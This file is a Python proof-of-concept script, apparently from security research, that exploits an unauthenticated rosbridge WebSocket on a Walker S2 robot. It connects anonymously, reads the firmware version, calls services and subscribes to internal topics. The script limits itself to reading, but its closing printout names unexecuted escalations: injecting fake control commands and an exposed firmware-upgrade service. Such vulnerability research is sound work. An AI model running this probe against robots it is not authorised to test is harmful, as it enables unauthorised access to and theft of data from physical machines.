#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Walker S2 · rosbridge :9090 无认证只读探测（订阅 + service 调用）

红线: 本脚本仅做「订阅」与「service 调用」，绝不做 advertise/发布。运动控制类 topic
      （/ecat/*、/vnav/task/command、/goal）不在本脚本范围，勿 --topic 指向它们。

用法:
    python rosbridge_probe.py                          # 订阅 /emb/battery_state，收 5 条
    python rosbridge_probe.py --topic /emb/getVer      # 换 topic
    python rosbridge_probe.py --call-service /emb/getVer   # 调一个无参 service
    python rosbridge_probe.py --count 1                # 收 1 条即退出
"""
import argparse
import json
import sys
import time

import websocket

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass


def main():
    ap = argparse.ArgumentParser(description="rosbridge :9090 无认证只读探测")
    ap.add_argument("--host", default="192.168.11.3")
    ap.add_argument("--port", type=int, default=9090)
    ap.add_argument("--topic", default="/emb/battery_state", help="订阅的 topic（只读）")
    ap.add_argument("--count", type=int, default=5, help="收 N 条消息后退出")
    ap.add_argument("--call-service", default=None, metavar="SERVICE", help="调用无参 service")
    ap.add_argument("--timeout", type=float, default=20, help="总超时秒数")
    args = ap.parse_args()

    url = f"ws://{args.host}:{args.port}"
    print("=" * 66)
    print("[*] 漏洞   : rosbridge_suite ROS2 无认证（无 rosauth 等价物）")
    print(f"[*] 目标   : {url}")
    print("=" * 66)

    ws = websocket.create_connection(url, timeout=args.timeout)
    print(f"[+] WebSocket 已连接: {url}")
    print(f"[*] 版本信息（直接读）: ", end="", flush=True)
    try:
        ws.send(json.dumps({"op": "call_service", "service": "/emb/getVer"}))
        m = json.loads(ws.recv())
        print(json.dumps(m.get("values", m), ensure_ascii=False)[:300])
    except Exception as e:
        print(f"(读取失败: {e})")

    if args.call_service:
        svc = args.call_service
        print(f"\n[>] 调用 service: {svc}（空参，只读）")
        ws.send(json.dumps({"op": "call_service", "service": svc}))
        try:
            m = json.loads(ws.recv())
            print(f"[<] 响应: {json.dumps(m, ensure_ascii=False)[:500]}")
        except Exception as e:
            print(f"[!] {e}")

    print(f"\n[>] 订阅 topic: {args.topic}（只读，收 {args.count} 条）")
    ws.send(json.dumps({"op": "subscribe", "topic": args.topic}))
    t0 = time.time()
    got = 0
    while got < args.count and time.time() - t0 < args.timeout:
        try:
            ws.settimeout(args.timeout - (time.time() - t0))
            m = json.loads(ws.recv())
        except Exception:
            break
        if m.get("op") == "publish":
            got += 1
            print(f"[{got}/{args.count}] topic={m.get('topic')} msg={json.dumps(m.get('msg', {}), ensure_ascii=False)[:300]}")
        elif m.get("op") == "service_response":
            print(f"[<] service_response: {json.dumps(m, ensure_ascii=False)[:300]}")
        else:
            print(f"[*] 其它消息: {json.dumps(m, ensure_ascii=False)[:300]}")

    print(f"\n[*] 共收到 {got} 条发布消息")
    if got > 0:
        print("[+] 匿名订阅成功 ✅ —— 无认证可被动窃取机器人内部 topic 数据")
    ws.send(json.dumps({"op": "unsubscribe", "topic": args.topic}))
    ws.close()

    print("\n[*] 延伸风险（未执行，红线内）:")
    print("    - advertise 发布可注入假状态/控制指令（需机器人吊起/急停）")
    print("    - /emb/upgrade service 暴露固件升级（见总览升级链路线）")


if __name__ == "__main__":
    main()
